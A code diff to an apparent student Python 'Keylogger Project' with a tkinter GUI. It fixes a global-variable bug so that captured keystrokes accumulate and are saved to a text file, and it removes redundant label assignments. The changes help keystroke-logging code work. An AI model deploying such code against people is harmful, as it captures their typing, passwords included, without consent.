@@ -37,6 +37,7 @@ def on_release(key):
         x = False
     update_json_file(key_list)
 
+    global key_strokes
     key_strokes = key_strokes + str(key)
     update_txt_file(str(key_strokes))
 
@@ -47,13 +48,13 @@ def butaction():
     listener.start()
 
 # UI Elements
-empty = Label(root, text=" ").grid(row=0, column=0)
-empty = Label(root, text=" ").grid(row=1, column=0)
-empty = Label(root, text=" ").grid(row=2, column=0)
+Label(root, text=" ").grid(row=0, column=0)
+Label(root, text=" ").grid(row=1, column=0)
+Label(root, text=" ").grid(row=2, column=0)
 # Fixed: Used 'Label' and 'Button' directly since we used 'from tkinter import *'
-empty = Label(root, text="Keylogger Project", font='Verdana 11 bold').grid(row=3, column=3)
-empty = Label(root, text=" ").grid(row=4, column=0)
-empty = Label(root, text=" ").grid(row=5, column=0)
+Label(root, text="Keylogger Project", font='Verdana 11 bold').grid(row=3, column=3)
+Label(root, text=" ").grid(row=4, column=0)
+Label(root, text=" ").grid(row=5, column=0)
 Button(root, text="Start Keylogger", command=butaction).grid(row=6, column=3)
 
 root.mainloop()
